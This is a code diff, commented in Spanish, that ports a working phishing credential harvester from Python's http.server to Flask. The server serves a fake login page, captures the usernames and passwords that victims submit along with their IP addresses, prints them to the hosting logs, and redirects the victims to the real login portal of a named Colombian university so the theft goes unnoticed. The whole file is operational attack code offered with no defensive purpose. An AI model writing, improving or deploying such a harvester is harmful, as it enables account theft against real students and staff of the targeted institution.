@@ -1,42 +1,37 @@
-import http.server
-import urllib.parse
+from flask import Flask, request, redirect, send_from_directory
 import datetime
 import os
 
-class PhishingHandler(http.server.SimpleHTTPRequestHandler):
-    def end_headers(self):
-        super().end_headers()
+app = Flask(__name__)
 
-    def do_POST(self):
-        content_length = int(self.headers.get('Content-Length', 0))
-        post_data = self.rfile.read(content_length).decode('utf-8', errors='ignore')
-        params = urllib.parse.parse_qs(post_data)
-        
-        usuario = params.get('usuario', [''])[0]
-        clave = params.get('clave', [''])[0]
-        
-        ip = self.headers.get('X-Forwarded-For', self.client_address[0])
-        fecha = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
-        
-        # IMPRESIÓN DIRECTA EN LOS LOGS DE RENDER (100% Seguro y visible al instante)
-        print("\n" + "="*60)
-        print(f"🚨 ¡CREDENCIALES CAPTURADAS EXITOSAMENTE! 🚨")
-        print(f"📅 Fecha y Hora: {fecha}")
-        print(f"🌐 IP de la Víctima: {ip}")
-        print(f"👤 Usuario / Documento: {usuario}")
-        print(f"🔑 Contraseña: {clave}")
-        print("="*60 + "\n")
-        
-        # Redirigir de inmediato a la víctima al sitio real de la universidad
-        self.send_response(302)
-        self.send_header('Location', 'https://sigedin.uniputumayo.edu.co/login')
-        self.end_headers()
+# Ruta para mostrar la página de inicio (index.html)
+@app.route('/')
+def home():
+    return send_from_directory('.', 'index.html')
+
+# Ruta para capturar los datos cuando el usuario presiona "Ingresar"
+@app.route('/', methods=['POST'])
+def capturar_credenciales():
+    # Obtener los datos del formulario de manera limpia y segura
+    usuario = request.form.get('usuario', '')
+    clave = request.form.get('clave', '')
+    
+    # Obtener la IP real de la víctima a través de los encabezados de Render
+    ip = request.headers.get('X-Forwarded-For', request.remote_addr)
+    fecha = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
+    
+    # IMPRESIÓN DIRECTA Y CLARA EN LOS LOGS DE RENDER
+    print("\n" + "="*60)
+    print(f"🚨 ¡CREDENCIALES CAPTURADAS EXITOSAMENTE! 🚨")
+    print(f"📅 Fecha y Hora: {fecha}")
+    print(f"🌐 IP de la Víctima: {ip}")
+    print(f"👤 Usuario / Documento: {usuario}")
+    print(f"🔑 Contraseña: {clave}")
+    print("="*60 + "\n")
+    
+    # Redirigir de inmediato al portal real de la universidad
+    return redirect('https://sigedin.uniputumayo.edu.co/login', code=302)
 
 if __name__ == '__main__':
     port = int(os.environ.get("PORT", 10000))
-    server_address = ('0.0.0.0', port)
-    httpd = http.server.HTTPServer(server_address, PhishingHandler)
-    print(f"==================================================")
-    print(f" SERVIDOR EN LA NUBE (RENDER) ACTIVO EN PUERTO {port}")
-    print(f"==================================================")
-    httpd.serve_forever()
+    app.run(host='0.0.0.0', port=port)
